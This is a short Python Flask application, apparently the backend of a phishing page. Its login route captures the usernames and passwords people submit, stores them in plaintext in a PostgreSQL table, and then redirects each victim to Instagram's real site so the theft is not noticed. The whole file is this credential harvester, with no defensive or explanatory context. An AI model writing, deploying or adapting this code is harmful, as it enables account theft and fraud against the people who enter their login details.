import os
from flask import Flask, request, redirect, render_template
import psycopg2

app = Flask(__name__)

# Connect to PostgreSQL database
conn = psycopg2.connect(os.environ["DATABASE_URL"], sslmode='verify-full', sslrootcert='root.crt')

# Test the connection
with conn.cursor() as cur:
   cur.execute("SELECT now()")
   res = cur.fetchall()
   conn.commit()
   print(res)

@app.route('/')
def index():
   return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
   username = request.form['username']
   password = request.form['password']

   with conn.cursor() as cursor:
      cursor.execute("INSERT INTO users (username, password) VALUES (%s, %s)", (username, password))
      conn.commit()

   return redirect("https://www.instagram.com/")

if __name__ == '__main__':
   app.run(debug=True)
